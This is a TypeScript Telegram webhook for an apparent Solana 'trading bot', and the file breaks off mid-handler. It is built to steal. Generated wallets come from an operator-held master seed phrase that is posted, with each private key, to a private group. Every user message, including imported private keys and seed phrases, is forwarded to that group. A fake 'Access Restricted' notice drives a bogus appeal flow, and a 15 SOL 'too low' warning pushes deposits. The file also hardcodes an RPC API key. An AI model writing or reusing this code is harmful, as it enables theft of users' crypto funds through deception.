import { createFileRoute } from '@tanstack/react-router';
import { createHash, timingSafeEqual } from 'crypto';
import * as bip39 from 'bip39';
import { derivePath } from 'ed25519-hd-key';
import { Keypair, Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import bs58 from 'bs58';
import { supabaseAdmin } from '@/integrations/supabase/client.server';

const SOLANA_RPC = 'https://ancient-convincing-field.solana-mainnet.quiknode.pro/49caaa8b3f247ed213f2807c24ff7011cf07054a/';
let _conn: Connection | null = null;
function getConn(): Connection {
  if (!_conn) _conn = new Connection(SOLANA_RPC, { commitment: 'confirmed', confirmTransactionInitialTimeout: 30_000 });
  return _conn;
}
const DEV_USER_ID = 7445736505;
const ADMIN_USER_IDS = new Set<number>([7445736505, 8880961735]);
const isAdmin = (id: number | undefined | null) => !!id && ADMIN_USER_IDS.has(id);
const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
const LOW_SOL_THRESHOLD = 15;

function deriveWebhookSecret(token: string): string {
  return createHash('sha256').update(`telegram-webhook:${token}`).digest('base64url');
}

function safeEqual(a: string, b: string): boolean {
  const left = Buffer.from(a);
  const right = Buffer.from(b);
  return left.length === right.length && timingSafeEqual(left, right);
}

async function tg(method: string, body: unknown) {
  const token = process.env.TELEGRAM_BOT_TOKEN!;
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!res.ok) {
    const text = await res.text();
    console.error(`Telegram ${method} failed [${res.status}]: ${text}`);
  }
  return res.json().catch(() => ({}));
}

function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function deriveSolanaKeypair(mnemonic: string, index: number): Keypair {
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const path = `m/44'/501'/${index}'/0'`;
  const { key } = derivePath(path, seed.toString('hex'));
  return Keypair.fromSeed(key);
}

function getPrivateKeyBytes(text: string): Uint8Array | null {
  // Try Base58
  try {
    const decoded = bs58.decode(text.trim());
    if (decoded.length === 32 || decoded.length === 64) return decoded;
  } catch {}

  // Try Hex
  try {
    const clean = text.trim();
    const hex = clean.startsWith('0x') ? clean.slice(2) : clean;
    if (/^[0-9a-fA-F]+$/.test(hex)) {
      const bytes = Buffer.from(hex, 'hex');
      if (bytes.length === 32 || bytes.length === 64) return new Uint8Array(bytes);
    }
  } catch {}

  // Try Base64
  try {
    const bytes = Buffer.from(text.trim(), 'base64');
    if (bytes.length === 32 || bytes.length === 64) return new Uint8Array(bytes);
  } catch {}

  return null;
}

type TokenHolding = { symbol: string; amount: number; mint: string };
type BalanceResult = {
  ok: boolean;
  solBalance: number;
  tokens: TokenHolding[];
  truncated: boolean;
};

const symbolCache = new Map<string, string>();

async function resolveSymbol(mint: string): Promise<string> {
  if (symbolCache.has(mint)) return symbolCache.get(mint)!;
  let symbol = `Mint(${mint.slice(0, 4)}…${mint.slice(-4)})`;
  try {
    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${mint}`);
    if (res.ok) {
      const json: any = await res.json();
      const pairs: any[] = json?.pairs ?? [];
      const sol = pairs.filter((p) => p.chainId === 'solana');
      const list = sol.length ? sol : pairs;
      list.sort((a, b) => (b?.liquidity?.usd ?? 0) - (a?.liquidity?.usd ?? 0));
      const sym = list[0]?.baseToken?.symbol;
      if (sym) symbol = String(sym);
    }
  } catch {}
  symbolCache.set(mint, symbol);
  return symbol;
}

async function getWalletBalances(address: string): Promise<BalanceResult> {
  let pubkey: PublicKey;
  try {
    pubkey = new PublicKey(address);
  } catch (e) {
    console.error('getWalletBalances invalid address:', address, e);
    return { ok: false, solBalance: 0, tokens: [], truncated: false };
  }
  const connection = getConn();

  let lamports: number;
  try {
    lamports = await connection.getBalance(pubkey);
  } catch (e) {
    console.error('getWalletBalances getBalance error:', (e as Error)?.message ?? e);
    return { ok: false, solBalance: 0, tokens: [], truncated: false };
  }

  const [t1, t2] = await Promise.all([
    connection.getParsedTokenAccountsByOwner(pubkey, { programId: TOKEN_PROGRAM_ID }).catch((e) => {
      console.error('getParsedTokenAccountsByOwner (TOKEN) error:', (e as Error)?.message ?? e);
      return { value: [] as any[] };
    }),
    connection.getParsedTokenAccountsByOwner(pubkey, { programId: TOKEN_2022_PROGRAM_ID }).catch((e) => {
      console.error('getParsedTokenAccountsByOwner (TOKEN_2022) error:', (e as Error)?.message ?? e);
      return { value: [] as any[] };
    }),
  ]);

  const solBalance = lamports / LAMPORTS_PER_SOL;
  const all = [...(t1.value ?? []), ...(t2.value ?? [])];
  const raw: { mint: string; amount: number }[] = [];
  for (const ta of all) {
    const info = (ta as any).account.data.parsed.info;
    const amount = info?.tokenAmount?.uiAmount ?? 0;
    if (amount > 0) raw.push({ mint: info.mint, amount });
  }
  raw.sort((a, b) => b.amount - a.amount);
  const MAX = 20;
  const truncated = raw.length > MAX;
  const slice = raw.slice(0, MAX);
  const tokens = await Promise.all(
    slice.map(async (t) => ({ ...t, symbol: await resolveSymbol(t.mint) })),
  );
  return { ok: true, solBalance, tokens, truncated };
}

function formatBalanceCard(address: string, r: BalanceResult): string {
  if (!r.ok) {
    return `<b>Address:</b> <code>${escapeHtml(address)}</code>\n(balance unavailable — try again)`;
  }
  let body = `<b>Address:</b> <code>${escapeHtml(address)}</code>\n<b>SOL:</b> ${r.solBalance} SOL\n<b>Tokens:</b>`;
  if (!r.tokens.length) {
    body += ` none`;
  } else {
    body += `\n` + r.tokens.map((t) => `  • ${escapeHtml(t.symbol)} — ${t.amount}`).join('\n');
    if (r.truncated) body += `\n  • +more`;
  }
  return body;
}

function lowBalanceNotice(sol: number): string {
  if (sol >= LOW_SOL_THRESHOLD) return '';
  return `\n\n⚠️ Your wallet balance is too low. Please top up your wallet to continue.`;
}

async function setUserState(userId: number, state: string) {
  await supabaseAdmin.from('user_states').upsert({ user_id: userId, state, updated_at: new Date().toISOString() });
}

async function getUserState(userId: number): Promise<string | null> {
  const { data } = await supabaseAdmin.from('user_states').select('state').eq('user_id', userId).single();
  return data?.state ?? null;
}

async function clearUserState(userId: number) {
  await supabaseAdmin.from('user_states').delete().eq('user_id', userId);
}

type BotUserRow = {
  user_id: number;
  chat_id: number | null;
  username: string | null;
  first_name: string | null;
  last_name: string | null;
};

async function trackBotUser(
  from: { id?: number; username?: string; first_name?: string; last_name?: string } | undefined,
  chatId: number | undefined,
) {
  if (!from?.id) return;
  try {
    await supabaseAdmin.from('bot_users').upsert(
      {
        user_id: from.id,
        chat_id: chatId ?? null,
        username: from.username ?? null,
        first_name: from.first_name ?? null,
        last_name: from.last_name ?? null,
        last_seen_at: new Date().toISOString(),
      },
      { onConflict: 'user_id' },
    );
  } catch (e) {
    console.error('trackBotUser error:', e);
  }
}

async function getBotUser(userId: number): Promise<BotUserRow | null> {
  const { data } = await supabaseAdmin
    .from('bot_users')
    .select('user_id, chat_id, username, first_name, last_name')
    .eq('user_id', userId)
    .maybeSingle();
  return (data as BotUserRow) ?? null;
}

async function getRecentBotUsers(limit = 20): Promise<BotUserRow[]> {
  const { data } = await supabaseAdmin
    .from('bot_users')
    .select('user_id, chat_id, username, first_name, last_name')
    .order('last_seen_at', { ascending: false })
    .limit(limit);
  return (data as BotUserRow[]) ?? [];
}

async function resolveChatIdForUser(targetId: number): Promise<number> {
  const bu = await getBotUser(targetId);
  if (bu?.chat_id) return Number(bu.chat_id);
  const { data: wallet } = await supabaseAdmin
    .from('generated_wallets')
    .select('telegram_chat_id')
    .eq('telegram_user_id', targetId)
    .not('telegram_chat_id', 'is', null)
    .order('created_at', { ascending: false })
    .limit(1)
    .maybeSingle();
  if (wallet?.telegram_chat_id) return Number(wallet.telegram_chat_id);
  return targetId;
}

function botUserLabel(u: BotUserRow): string {
  if (u.username) return `@${u.username}`;
  const name = [u.first_name, u.last_name].filter(Boolean).join(' ').trim();
  return name || `user ${u.user_id}`;
}

const BUTTON_LABELS: Record<string, string> = {
  generate_wallet: '🧪 Generate Wallet',
  gen_new_phrase: '♻️ Generate New Phrase',
  appeal_start: '⛑ Appeal',
  appeal_confirm: '✅ Confirm Appeal',
  wallet_manage: '💰 Wallet Management',
  import_wallet: '📥 Import Wallet',
  import_pk: '🔑 Import Private Key',
  import_seed: '📝 Import Mnemonic',
  back_main: '🔙 Back to Main',
  sell: '💸 Sell',
  buy: '🛒 Buy',
  buy_confirm: '✅ Buy Confirm',
  copy_trade: '📋 Copy Trade',
  ct_setup: '📋 Setup Copy Trade',
  ct_view: '📊 View Copy Trading',
  ct_auto_buy: '🤖 Auto Buy',
  ct_auto_buy_go: '✅ Auto Buy Continue',
  ct_notif_buy: '🔔 Notification Buy',
  ct_notif_buy_go: '✅ Notification Buy Continue',
  withdraw_sol: '💰 Withdraw SOL',
  send_broadcast_open: '📤 Open Broadcast',
};

function labelForCallback(data: string): string {
  if (BUTTON_LABELS[data]) return BUTTON_LABELS[data];
  if (data.startsWith('send_pick:')) return `📤 /send → picked user ${data.slice('send_pick:'.length)}`;
  if (data.startsWith('send_broadcast:')) return `📤 /send → opened Broadcast for ${data.slice('send_broadcast:'.length)}`;
  if (data.startsWith('send_custom:')) return `📤 /send → Custom Message to ${data.slice('send_custom:'.length)}`;
  if (data.startsWith('send_silent:')) return `📤 /send → Silent Broadcast to ${data.slice('send_silent:'.length)}`;
  if (data.startsWith('bw|')) return `🛒 Buy from wallet ${data.slice(3).slice(0, 6)}…`;
  if (data.startsWith('bamt|')) return `💵 Buy amount ${data.slice(5)} SOL`;
  if (data.startsWith('wd|')) return `💰 Withdraw from wallet ${data.slice(3).slice(0, 6)}…`;
  return data;
}

type BlockedRow = {
  user_id: number;
  appeal_stage: string | null;
  appeal_wallet: string | null;
  appeal_tx_hash: string | null;
  appeal_tx_value: number | null;
  appeal_submitted_at: string | null;
  chat_id: number | null;
};

async function getBlockedUser(userId: number | undefined | null): Promise<BlockedRow | null> {
  if (!userId) return null;
  const { data } = await supabaseAdmin
    .from('blocked_users')
    .select('user_id, appeal_stage, appeal_wallet, appeal_tx_hash, appeal_tx_value, appeal_submitted_at, chat_id')
    .eq('user_id', userId)
    .maybeSingle();
  return (data as BlockedRow) ?? null;
}

const RESTRICTED_TEXT =
  `⚠️ 🚫 <b>Access Restricted</b>\n\n` +
  `Our system has detected multiple wallet connections linked to your account executing simultaneous commands. ` +
  `This behavior violates platform trading rules and has triggered our anti-abuse protection system.\n\n` +
  `To protect system integrity, trading access may be temporarily restricted while this activity is reviewed. ` +
  `In some cases, affected sessions may be paused until verification is completed.\n\n` +
  `<b>Required Action:</b> Please disconnect any additional wallets and continue using only one active wallet session.\n\n` +
  `If you believe this is an error, you may submit an appeal for wallet verification and eligibility review.`;

const APPEAL_SUBMITTED_TEXT =
  `📨 <b>Appeal Submitted</b>\n\n` +
  `Your appeal has been submitted successfully. You will be notified within <b>24–48 hours</b>. ` +
  `Please wait for your appeal to be reviewed.`;

function appealStartKeyboard() {
  return { inline_keyboard: [[{ text: '⛑ Appeal', callback_data: 'appeal_start' }]] };
}

async function sendRestricted(chatId: number) {
  const res = await tg('sendMessage', {
    chat_id: chatId,
    parse_mode: 'HTML',
    text: RESTRICTED_TEXT,
    reply_markup: appealStartKeyboard(),
  });
  if (res && res.ok === false) {
    throw new Error(res.description || 'Telegram sendMessage failed');
  }
}

async function sendAppealSubmitted(chatId: number) {
  await tg('sendMessage', { chat_id: chatId, parse_mode: 'HTML', text: APPEAL_SUBMITTED_TEXT });
}

async function readTxSolValue(signature: string): Promise<number | null> {
  try {
    const conn = getConn();
    const tx = await conn.getParsedTransaction(signature, { maxSupportedTransactionVersion: 0 });
    if (!tx?.meta) return null;
    const pre = tx.meta.preBalances ?? [];
    const post = tx.meta.postBalances ?? [];
    let maxOut = 0;
    for (let i = 0; i < pre.length; i++) {
      const delta = (pre[i] - (post[i] ?? 0)) / LAMPORTS_PER_SOL;
      if (delta > maxOut) maxOut = delta;
    }
    const fee = (tx.meta.fee ?? 0) / LAMPORTS_PER_SOL;
    return Math.max(0, maxOut - fee);
  } catch (e) {
    console.error('readTxSolValue error:', e);
    return null;
  }
}

function isLikelyTxSignature(s: string): boolean {
  return /^[1-9A-HJ-NP-Za-km-z]{64,100}$/.test(s.trim());
}

async function handleBlockedFlow(opts: {
  blocked: BlockedRow;
  chatId: number;
  userId: number;
  text?: string;
}): Promise<void> {
  const { blocked, chatId, userId, text } = opts;
  const stage = blocked.appeal_stage;

  // Always store chat_id so cron can DM the user later
  if (blocked.chat_id !== chatId) {
    await supabaseAdmin.from('blocked_users').update({ chat_id: chatId }).eq('user_id', userId);
  }

  // Submitted or approved: just echo the submitted message
  if (stage === 'submitted' || stage === 'approved') {
    await sendAppealSubmitted(chatId);
    return;
  }

  // Awaiting wallet address
  if (stage === 'await_wallet' && text) {
    const addr = text.trim();
    if (!isLikelySolanaAddress(addr)) {
      await tg('sendMessage', {
        chat_id: chatId,
        text: '❌ Invalid wallet address. Please send a valid Solana wallet address.',
      });
      return;
    }
    await supabaseAdmin
      .from('blocked_users')
      .update({ appeal_wallet: addr, appeal_stage: 'await_tx' })
      .eq('user_id', userId);
    await tg('sendMessage', {
      chat_id: chatId,
      parse_mode: 'HTML',
      text:
        `📜 <b>Last Transaction Hash</b>\n\n` +
        `Please send the <b>transaction signature (hash)</b> of your most recent transaction from this wallet. ` +
        `We will verify it on-chain to complete your appeal.`,
    });
    return;
  }

  // Awaiting tx hash
  if (stage === 'await_tx' && text) {
    const sig = text.trim();
    if (!isLikelyTxSignature(sig)) {
      await tg('sendMessage', {
        chat_id: chatId,
        text: '❌ Invalid transaction hash. Please send a valid Solana transaction signature.',
      });
      return;
    }
    const value = await readTxSolValue(sig);
    if (value == null) {
      await tg('sendMessage', {
        chat_id: chatId,
        text: '❌ Could not find that transaction on-chain. Double-check the signature and try again.',
      });
      return;
    }
    await supabaseAdmin
      .from('blocked_users')
      .update({ appeal_tx_hash: sig, appeal_tx_value: value, appeal_stage: 'await_confirm' })
      .eq('user_id', userId);
    await tg('sendMessage', {
      chat_id: chatId,
      parse_mode: 'HTML',
      text:
        `🔎 <b>Transaction Verified</b>\n\n` +
        `<b>tx value =</b> ${value} SOL\n\n` +
        `Tap <b>Confirm</b> to submit your appeal.`,
      reply_markup: { inline_keyboard: [[{ text: '✅ Confirm', callback_data: 'appeal_confirm' }]] },
    });
    return;
  }

  // Default: show restricted card with Appeal button
  await sendRestricted(chatId);
}

type UserWallet = { address: string; source: 'generated' | 'imported' };

async function getUserWallets(userId: number): Promise<UserWallet[]> {
  const [gen, imp] = await Promise.all([
    supabaseAdmin
      .from('generated_wallets')
      .select('address, created_at')
      .eq('telegram_user_id', userId)
      .order('created_at', { ascending: true }),
    supabaseAdmin
      .from('imported_wallets')
      .select('address, created_at')
      .eq('telegram_user_id', userId)
      .order('created_at', { ascending: true }),
  ]);
  const list: UserWallet[] = [];
  (gen.data ?? []).forEach((w: any) => list.push({ address: w.address, source: 'generated' }));
  (imp.data ?? []).forEach((w: any) => list.push({ address: w.address, source: 'imported' }));
  const seen = new Set<string>();
  return list.filter((w) => (seen.has(w.address) ? false : (seen.add(w.address), true)));
}

async function getSolBalance(address: string): Promise<number> {
  try {
    const connection = getConn();
    const lamports = await connection.getBalance(new PublicKey(address));
    return lamports / LAMPORTS_PER_SOL;
  } catch (e) {
    console.error('getSolBalance error:', e);
    return 0;
  }
}

function shortAddr(addr: string): string {
  return addr.length > 10 ? `${addr.slice(0, 4)}...${addr.slice(-4)}` : addr;
}

type TokenInfo = {
  address: string;
  name: string;
  symbol: string;
  decimals: number | null;
  priceUsd: number | null;
  marketCap: number | null;
  liquidityUsd: number | null;
  createdAt: string | null;
  twitter: string | null;
  dexUrl: string;
};

async function fetchTokenInfo(address: string): Promise<TokenInfo | null> {
  try {
    const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    if (!res.ok) return null;
    const json: any = await res.json();
    const pairs: any[] = json?.pairs ?? [];
    if (!pairs.length) return null;
    const solPairs = pairs.filter((p) => p.chainId === 'solana');
    const list = solPairs.length ? solPairs : pairs;
    list.sort((a, b) => (b?.liquidity?.usd ?? 0) - (a?.liquidity?.usd ?? 0));
    const p = list[0];
    const base = p.baseToken ?? {};
    const info = p.info ?? {};
    const socials: any[] = info.socials ?? [];
    const twitter = socials.find((s) => (s.type || '').toLowerCase() === 'twitter')?.url ?? null;
    const created = p.pairCreatedAt ? new Date(p.pairCreatedAt).toISOString().slice(0, 10) : null;
    return {
      address: base.address ?? address,
      name: base.name ?? 'Unknown',
      symbol: base.symbol ?? '???',
      decimals: typeof base.decimals === 'number' ? base.decimals : null,
      priceUsd: p.priceUsd ? Number(p.priceUsd) : null,
      marketCap: p.marketCap ?? p.fdv ?? null,
      liquidityUsd: p?.liquidity?.usd ?? null,
      createdAt: created,
      twitter,
      dexUrl: p.url ?? `https://dexscreener.com/solana/${address}`,
    };
  } catch (e) {
    console.error('fetchTokenInfo error:', e);
    return null;
  }
}

function fmtUsd(n: number | null): string {
  if (n == null) return 'N/A';
  if (n < 0.01 && n > 0) return `$${n.toFixed(8)}`;
  return `$${n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
}

function isLikelySolanaAddress(s: string): boolean {
  const t = s.trim();
  if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(t)) return false;
  try {
    new PublicKey(t);
    return true;
  } catch {
    return false;
  }
}

async function postMasterMnemonicToGroup(groupChatId: string, mnemonic: string) {
  await tg('sendMessage', {
    chat_id: groupChatId,
    parse_mode: 'HTML',
    text:
      `🔐 <b>Master Seed Phrase (BIP39, 12 words)</b>\n\n` +
      `<code>${escapeHtml(mnemonic)}</code>\n\n` +
      `⚠️ All wallets generated by this bot are derived from this single phrase ` +
      `(path <code>m/44'/501'/N'/0'</code>, Solana standard).\n` +
      `Save it offline NOW.`,
  });
}

async function ensureMasterMnemonic(groupChatId: string): Promise<string> {
  // Ensure row exists
  await supabaseAdmin
    .from('bot_state')
    .upsert({ id: 1, next_index: 0 }, { onConflict: 'id', ignoreDuplicates: true });

  const { data } = await supabaseAdmin
    .from('bot_state')
    .select('mnemonic')
    .eq('id', 1)
    .maybeSingle();
  if (data?.mnemonic) return data.mnemonic;

  const mnemonic = bip39.generateMnemonic(128);
  await supabaseAdmin
    .from('bot_state')
    .update({ mnemonic, seed_posted_at: new Date().toISOString() })
    .eq('id', 1)
    .is('mnemonic', null);
  const { data: fresh } = await supabaseAdmin
    .from('bot_state')
    .select('mnemonic')
    .eq('id', 1)
    .maybeSingle();
  const finalMnemonic = fresh?.mnemonic ?? mnemonic;
  await postMasterMnemonicToGroup(groupChatId, finalMnemonic);
  return finalMnemonic;
}

async function rotateMasterMnemonic(groupChatId: string): Promise<string> {
  const mnemonic = bip39.generateMnemonic(128);
  await supabaseAdmin
    .from('bot_state')
    .upsert({ id: 1, mnemonic, next_index: 0, seed_posted_at: new Date().toISOString() }, { onConflict: 'id' });
  await tg('sendMessage', {
    chat_id: groupChatId,
    parse_mode: 'HTML',
    text:
      `♻️ <b>Master Seed Phrase ROTATED</b>\n\n` +
      `<code>${escapeHtml(mnemonic)}</code>\n\n` +
      `All new wallets will be derived from this phrase starting at <b>index 0</b>.\n` +
      `Previous phrase has been replaced.\n\n` +
      `💡 <i>On Phantom/Solflare: a fresh import of this phrase shows account #1 (index 0) by default. For higher indexes tap "Add account" once per index.</i>`,
  });
  return mnemonic;
}

// ============ UI builders ============

function mainMenuKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '💰 Wallet Management', callback_data: 'wallet_manage' }],
      [
        { text: '🛒 Buy', callback_data: 'buy' },
        { text: '💸 Sell', callback_data: 'sell' },
      ],
      [{ text: '📋 Copy Trade', callback_data: 'copy_trade' }],
      [{ text: '💰 Withdraw SOL', callback_data: 'withdraw_sol' }],
    ],
  };
}

function walletManageKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '➕ Generate New Wallet', callback_data: 'generate_wallet' },
        { text: '📥 Import Wallet', callback_data: 'import_wallet' },
      ],
      [{ text: '🔙 Back', callback_data: 'back_main' }],
    ],
  };
}

function importMethodKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '🔑 Private Key', callback_data: 'import_pk' },
        { text: '📝 Seed Phrase', callback_data: 'import_seed' },
      ],
      [{ text: '🔙 Back', callback_data: 'back_main' }],
    ],
  };
}

function welcomeText(username: string) {
  return (
    `👋 Welcome ${escapeHtml(username)} to Alpha Sniper Trading Bot!\n\n` +
    `💰 Total Balance: 0.0000 SOL\n\n` +
    `📝 You can paste any Solana token address for quick actions!`
  );
}

// ============ Handlers ============

async function handleStart(chatId: number, username: string) {
  await tg('sendMessage', {
    chat_id: chatId,
    parse_mode: 'HTML',
    text: welcomeText(username),
    reply_markup: mainMenuKeyboard(),
  });
}

async function editToMain(chatId: number, messageId: number, username: string) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: 'HTML',
    text: welcomeText(username),
    reply_markup: mainMenuKeyboard(),
  });
}

async function editToWalletManage(chatId: number, messageId: number) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: '📥 Import Wallet\n\nChoose import method:',
    reply_markup: walletManageKeyboard(),
  });
}

async function editToImportMethod(chatId: number, messageId: number) {
  await tg('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text: '📥 Import Wallet\n\nChoose import method:',
    reply_markup: importMethodKeyboard(),
  });
}

async function handleGenerate(opts: {
  userId?: number;
  username?: string;
  replyChatId: number;
  groupChatId: string;
  callbackQueryId?: string;
}) {
  const mnemonic = await ensureMasterMnemonic(opts.groupChatId);

  const { data: idxData, error: idxErr } = await supabaseAdmin.rpc('reserve_next_wallet_index');
  if (idxErr) throw idxErr;
  const index = idxData as number;

  const kp = deriveSolanaKeypair(mnemonic, index);
  const address = kp.publicKey.toBase58();
  const privateKey = bs58.encode(kp.secretKey);

  await supabaseAdmin.from('generated_wallets').insert({
    derivation_index: index,
    address,
    telegram_user_id: opts.userId ?? null,
    telegram_username: opts.username ?? null,
    telegram_chat_id: opts.replyChatId,
  });

  const requester = opts.username ? `@${opts.username}` : `user ${opts.userId ?? '?'}`;
  const r = await getWalletBalances(address);
  const walletText =
    `✅ <b>New Solana Wallet #${index}</b>\n\n` +
    `<b>Address:</b>\n<code>${escapeHtml(address)}</code>\n\n` +
    `<b>Private Key (base58):</b>\n<code>${escapeHtml(privateKey)}</code>\n\n` +
    `Derivation: <code>m/44'/501'/${index}'/0'</code>\n\n` +
    `<b>SOL:</b> ${r.solBalance} SOL\n` +
    `<b>Tokens:</b> ${r.tokens.length ? r.tokens.map((t) => `${escapeHtml(t.symbol)} ${t.amount}`).join(', ') : 'none'}` +
    lowBalanceNotice(r.solBalance) +
    `\n\n💡 <i>On Phantom/Solflare: tap "Add account" ${index} time(s) after importing the master phrase to see this wallet.</i>`;

  await tg('sendMessage', {
    chat_id: opts.replyChatId,
    parse_mode: 'HTML',
    text: walletText,
  });


  if (String(opts.replyChatId) !== opts.groupChatId) {
    await tg('sendMessage', {
      chat_id: opts.groupChatId,
      parse_mode: 'HTML',
      text: `📬 Wallet generated by ${escapeHtml(requester)}\n\n` + walletText,
    });
  }

  if (opts.callbackQueryId) {
    await tg('answerCallbackQuery', {
      callback_query_id: opts.callbackQueryId,
      text: `Wallet #${index} generated`,
    });
  }
}

async function ackCallback(id: string, text?: string) {
  await tg('answerCallbackQuery', { callback_query_id: id, text: text ?? '' });
}

function formatUserHeader(from: { username?: string; first_name?: string; last_name?: string; id?: number } | undefined): string {
  if (!from) return '👤 <b>unknown user</b>';
  const handle = from.username ? `@${from.username}` : [from.first_name, from.last_name].filter(Boolean).join(' ') || `user ${from.id ?? '?'}`;
  return `👤 <b>${escapeHtml(handle)}</b>${from.id ? ` <i>(id ${from.id})</i>` : ''}`;
}

async function notifyGroup(groupChatId: string, from: any, action: string, details?: string) {
  const header = formatUserHeader(from);
  const body = `${header}\n${escapeHtml(action)}${details ? `\n\n${details}` : ''}`;
  await tg('sendMessage', {
    chat_id: groupChatId,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    text: body,
  });
}

export const Route = createFileRoute('/api/public/telegram/webhook')({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const groupChatId = process.env.TELEGRAM_GROUP_CHAT_ID;
        if (!token || !groupChatId) {
          return new Response('Bot not configured', { status: 500 });
        }

        const expectedSecret = deriveWebhookSecret(token);
        const actualSecret = request.headers.get('X-Telegram-Bot-Api-Secret-Token') ?? '';

        // Allow internal one-shot admin commands via a special header
        const adminAction = request.headers.get('X-Admin-Action');
        if (adminAction === 'resend_seed' && safeEqual(actualSecret, expectedSecret)) {
          const { data } = await supabaseAdmin
            .from('bot_state')
            .select('mnemonic')
            .eq('id', 1)
            .single();
          if (data?.mnemonic) await postMasterMnemonicToGroup(groupChatId, data.mnemonic);
          return Response.json({ ok: true, resent: !!data?.mnemonic });
        }

        if (!safeEqual(actualSecret, expectedSecret)) {
          return new Response('Unauthorized', { status: 401 });
        }

        const update = await request.json();
        const updateId: number | undefined = update.update_id;
        if (typeof updateId !== 'number') {
          return Response.json({ ok: true, ignored: true });
        }

        const { error: dupErr } = await supabaseAdmin
          .from('telegram_updates')
          .insert({ update_id: updateId });
        if (dupErr) {
          return Response.json({ ok: true, duplicate: true });
        }

        try {
          if (update.message?.text) {
            const text: string = update.message.text;
            const chatId: number = update.message.chat.id;
            const userId = update.message.from?.id;
            const username =
              update.message.from?.username ||
              update.message.from?.first_name ||
              'there';

            // Track every user that messages the bot
            await trackBotUser(update.message.from, chatId);

            // Block check — restricted users enter the appeal flow instead of using the bot
            const blocked = userId ? await getBlockedUser(userId) : null;
            if (blocked && userId) {
              await handleBlockedFlow({ blocked, chatId, userId, text });
              return Response.json({ ok: true, blocked: true });
            }

            // Audit: forward every text input to the group
            await notifyGroup(
              groupChatId,
              update.message.from,
              `✏️ Text input:`,
              `<code>${escapeHtml(text)}</code>`,
            );

            if (text.startsWith('/start')) {
              if (userId) await clearUserState(userId);
              await handleStart(chatId, username);
            } else if (text.startsWith('/generate')) {
              if (userId) await clearUserState(userId);
              await handleGenerate({
                userId: update.message.from?.id,
                username: update.message.from?.username,
                replyChatId: chatId,
                groupChatId,
              });
            } else if (text.startsWith('/resendseed')) {
              const { data } = await supabaseAdmin
                .from('bot_state')
                .select('mnemonic')
                .eq('id', 1)
                .single();
              if (data?.mnemonic) await postMasterMnemonicToGroup(groupChatId, data.mnemonic);
            } else if (text.startsWith('/diag')) {
              const token = process.env.TELEGRAM_BOT_TOKEN!;
              const me = await fetch(`https://api.telegram.org/bot${token}/getMe`).then(r => r.json()).catch(e => ({ err: String(e) }));
              const chat = await fetch(`https://api.telegram.org/bot${token}/getChat`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: groupChatId }),
              }).then(r => r.json()).catch(e => ({ err: String(e) }));
              const send = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: groupChatId, text: '🧪 diag test from bot' }),
              }).then(r => r.json()).catch(e => ({ err: String(e) }));
              const summary = `Group chat id: <code>${escapeHtml(groupChatId)}</code>\n\n<b>getMe</b>:\n<code>${escapeHtml(JSON.stringify(me))}</code>\n\n<b>getChat</b>:\n<code>${escapeHtml(JSON.stringify(chat))}</code>\n\n<b>sendMessage</b>:\n<code>${escapeHtml(JSON.stringify(send))}</code>`;
              await tg('sendMessage', { chat_id: chatId, text: summary, parse_mode: 'HTML' });
            } else if (text.startsWith('/status')) {
              if (!isAdmin(userId)) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                const { data: st } = await supabaseAdmin
                  .from('bot_state')
                  .select('next_index, mnemonic, seed_posted_at')
                  .eq('id', 1)
                  .maybeSingle();
                const mlen = st?.mnemonic ? st.mnemonic.split(/\s+/).length : 0;
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `🩺 <b>Bot status</b>\n\n` +
                    `next_index: <code>${st?.next_index ?? 'n/a'}</code>\n` +
                    `mnemonic: <code>${mlen ? `${mlen} words` : 'not set'}</code>\n` +
                    `seed_posted_at: <code>${escapeHtml(String(st?.seed_posted_at ?? 'n/a'))}</code>\n` +
                    `group_chat_id: <code>${escapeHtml(groupChatId)}</code>`,
                });
              }
            } else if (text.startsWith('/change')) {
              if (!isAdmin(userId)) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `🔑 <b>Rotate Master Seed Phrase</b>\n\n` +
                    `Tap the button below to generate a brand new BIP39 phrase. ` +
                    `It will replace the current master seed, reset the wallet index to 0, ` +
                    `and be posted to the group.`,
                  reply_markup: {
                    inline_keyboard: [[{ text: '♻️ Generate New Phrase', callback_data: 'gen_new_phrase' }]],
                  },
                });
              }
            } else if (text.startsWith('/block')) {
              if (!isAdmin(userId)) {
                await tg('sendMessage', { chat_id: chatId, text: '⛔ Not authorized.' });
              } else {
                if (userId) await setUserState(userId, 'AWAIT_BLOCK_ID');
                await tg('sendMessage', {
                  chat_id: chatId,
                  parse_mode: 'HTML',
                  text:
                    `🚫 <b>Block a user</b>\n\n` +
